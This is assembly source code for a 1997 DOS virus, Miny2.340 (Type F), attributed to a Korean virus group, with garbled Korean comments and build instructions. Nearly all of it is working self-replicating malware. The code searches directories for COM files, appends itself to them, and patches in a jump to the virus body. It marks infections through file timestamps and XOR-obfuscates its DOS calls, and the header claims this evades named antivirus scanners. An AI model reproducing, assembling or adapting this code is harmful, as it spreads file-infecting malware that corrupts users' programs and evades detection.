;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.340 (Type F)
; Author : Osiris
; Group : CVC (Corean Virus Club), Corea
; Date : 1997/08/25
;
; Type : Non-resident COM infector
;
; Miny2 (Type E) · ˆ¬åÌe·¡”a.
;
; ”a·q‰Á ˆ{·e ¸ñ·¡ ˆ¬å–A´ö”a.
;
;  F-prot · ·¥‰·»¡“w ˆñ¬aµA•¡ »¥”e–A»¡ ´g“e”a.
;  -> ¬—ˆb¥¡”a Ó±—i´ö”a. ·©”e ¤a·¡œá¯a¯¡¸b¸ñ ŠÐa“e ¤w¯¢·i ´aµ ´ôµA ¤áv‰¡
;     COM ´|¦¦… ¥¢ŠÐa“eˆõ•¡ ­A‹a åËa¹¡¸b·a¡ ¤aŽ´ö”a.
;
; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : »¥”e x
;
;
; ”á·¡¬w ·¡ ¤a·¡œá¯aŸi ”e®…Ðe Miny2 · ´aŸA¸b·a¡ ¥¡»¡  i´v·a¡e Ðe”a.
; Type E ¦Èá“e ¶¥Ñw Miny2 µÁ“e ¸åÑa ”aŸe Š¹¡Ÿi ˆa»¡‰¡ ·¶”a.
;
; TASM MINY2E      \
; TLINK MINY2E      >  ¯©Ð— ¤w¤ó
; EXE2COM MINY2E   /
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; ³aA‹¡ˆt (´a¢·©•¡ ´eÐe”a.)
            nop                         ; ´|¦¦… ¥¢Š¯¡ ¤a·¡œá¯aˆa ÌaŠA–A‹¡
            nop                         ; ˜¢…µA ·¡ ˆt·i ý´ö”a.
 start:
            mov   bp,100h               ; BP = ¤a·¡œá¯a ¯¡¸b¸ñ - 3

            lea   si,COM_head[BP]       ; COM ´|¦¦… ¥¢Š
            mov   ax,es                 ; F-prot ·¥‰·»¡“w·i Ï¡Ða‹¡ ¶áÐ¬á
            add   ax,0010h              ; ­A‹a åËa ¹¡¸b
            mov   es,ax                 ; CS:100h Ða‰¡ ES+10h:0000 Ða‰¡“e ˆ{”a.
            xor   di,di                 ; DI=0
            movsw                       ; ´|¦¦… ¥¢Š
            movsb                       ;
            mov   di,0FFh               ;
            inc   di                    ; DI=100h
            push  di                    ;
            push  cs                    ; cs=es
            pop   es

            mov   cx,0080h              ; DTA ¡ ¬a¶wÐ PSP ¶w ·©¦ˆa ÌaŠA
            mov   si,0080h              ; –A£a¡ ¸q¯¡ ¸á¸wÐe”a.
            lea   di,End_Virus[BP]      ;
            repz  movsb

            mov   ah,(47h xor 49h)
            xor   dl,dl                 ; µ• —¡BÉ¡Ÿ¡ ¸á¸w
            mov   si, BP
            add   si, offset OldDir + 1 ;
            mov   byte ptr OldDir[BP],'\'
            call  int21                 ;

            mov   byte ptr Count[BP],00 ; ˆqµqÄa¶…Èá 0

 FindFirst:
            mov   ah,(4Eh xor 49h)      ; Ìa·© Àx‹¡
            mov   cx,00100011B          ; Ìa·© ­¢¬÷
            lea   dx,Match_COM[BP]      ; Àx‰¡¸a Ða“e Ìa·© (*.c?m)
 Find:      call  Int21
            jc    ChgDir                ; µAœá¡e ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·
            call  ChkInfected           ; ˆqµq žË¥ Ñ¡Â‰
            cmp   byte ptr Count[BP],3  ; 3 ˆ ˆqµq ¯¡Åva ?
            jz    Restart               ; ‹aœá¡e ˆqµq ÑÉ•· {
            mov   ah,(4Fh xor 49h)      ; ”a·q Ìa·© Àx‹¡
            jmp   Find

 ChgDir:    mov   ah,3Bh                ; ¬w¶á —¡BÉ¡Ÿ¡¡ ·¡•·
            lea   dx, UP[BP]
            int   21h
            jnc   FindFirst             ; ¬w¶á¡ ·¡•·Ð–·a¡e ”a¯¡ COM Àx‹¡
 Restart:
            mov   ah,3Bh                ; ¶¥œ —¡BÉ¡Ÿ¡¡ ·¡•·
            lea   dx, OldDir[BP]
            int   21h

            lea   si,End_Virus[BP]      ; ¶¥œ DTA ¥¢Š
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET                         ; ¶¥œ COM Ìa·© ¯©Ð—

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; ¯©¹A ¤a·¡œá¯a ˆqµq žË¥
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; ˆqµq µa¦Ÿi ÑÂ·¥Ðe”a.
            cmp   word ptr DS:[009Eh],'OC' ; COMMAND.COM ·¥ˆa ?
            jz    ErrorRtn
            mov   al,DS:[0096h]         ; 62 Á¡ ·¥»¡ ˆñ¬aÐe”a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 ErrorRtn:  RET                         ; 62 Á¡ ·¡¡e ”a·q Ìa·© ˆñ¬a¡ ·¡´á»±

 Infect:    mov   ax,(4301h XOR 4949h)  ; ·ª‹¡/³a‹¡ ­¢¬÷·a¡ ¤aŽ‘
            xor   cx,cx
            mov   dx,009Eh
            call  Int21
            jc    ErrorRtn              ; µAœá ¤i¬—

            mov   ax,(3D02h xor 4949h)  ; Ìa·© µ¡Ïe
            call  Int21
            jc    ErrorRtn              ;

            xchg  ax,bx                 ; BX = Ìa·©Ð…—i

            mov   ax,(5700h XOR 49h)    ; Ìa·© ¸b¬÷ ¯¡ˆe ´è‹¡
            call  Int21
            push  cx                    ; ¸b¬÷ ¯¡ˆe ¸á¸w
            push  dx                    ;

            mov   ah,(3Fh XOR 49h)      ; ´|¦¦… ·ª‹¡
            lea   dx,COM_Head[BP]       ; ¤áÌá º­¡
            mov   cx,0003               ; 3 ¤a·¡Ëa
            call  Int21
            cmp   byte ptr COM_Head[BP],'M' ; MZ ·¥ˆa ?
            jnz   lseek2
            cmp   byte ptr COM_Head[BP+1],'Z'
            jz    Error
 lseek2:
            mov   al,02                 ; Ìa·© {·a¡ ·¡•·
            call  lseek
            or    dx,dx                 ; 64 KB ·¡¬w·¥ˆa ?
            jnz   Error                 ; ”a·q ˆñ¬a˜ µ¡Ïe ¯¡Ç¡»¡ ´g‹¡¶áÐ¬á

            sub   ax,3                  ; ¸ñÏaˆt ‰¬e
            mov   word ptr JumpCode[BP+1],ax     ;
            add   AX,100h               ; Ìa·©{ + 100h = ¤a·¡œá¯a¯¡¸b¸ñ - 3
            mov   word ptr Start[BP+1],ax

            mov   ah,(40h XOR 49h)      ; ¤a·¡œá¯a ³a‹¡
            mov   cx,offset (End_virus - start)
            lea   dx,start[BP]
            call  int21

            mov   al,00                 ; Àá·q·a¡ ·¡•·
            call  lseek

            mov   ah,(40h xor 49h)      ; ¸ñÏa Å¡—a ³a‹¡
            mov   cx,0003
            mov   byte ptr JumpCode[BP],0EAh
            dec   byte ptr JumpCode[BP] ; E9h = JMP
            lea   dx,JumpCode[BP]
            call  int21

            inc   byte ptr Count[BP]    ; ˆqµq ˆ•® »wˆa
 Error:
            pop   dx                    ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            pop   cx                    ;
            or    cx,+1Fh               ; 62 Á¡¡  e—i‹¡
            mov   ax,(5701h XOR 4949h)  ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            call  Int21

            mov   ah,(3Eh XOR 49h)      ; Ìa·© ”h‹¡
            call  Int21
            RET

 lseek:                                 ; Í¡·¥Èá ·¡•·
            xor   cx,cx
            xor   dx,dx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret

 Int21:                                 ; XOR 49h µe¬eÒ
            xor   ax,4949h              ; ·¥ÈáœóËa 21h Ñ¡Â‰
            int   21h
            ret


 COM_head   db    0CDh,20h,90h          ; COM ´|¦¦…
 Match_COM  db    '*.c?m',00            ; COM Ìa·© Àx‹¡
 Up         db    '..',00               ; ¬w¶á —¡BÉ¡Ÿ¡
            db    'Miny2'               ; £¡“¡ 2
            db    '(c) 1997 Osiris of CVC,Corea',00
 End_Virus:                             ; ¯©¹A °á»¡“e ¤a·¡œá¯a {


 Count      db    ?                     ; ˆqµq ˆ•®
 JumpCode   db    ?,?,?                 ; ¸ñÏa ˆt
 OldDir     db    ?                     ; µ• —¡BÉ¡Ÿ¡ ¸á¸w ¸w­¡
            db    80h dup (0)
 OldDTA     db    80h dup (0)           ; µ• DTA ¶w ¸á¸w
            END   Miny2

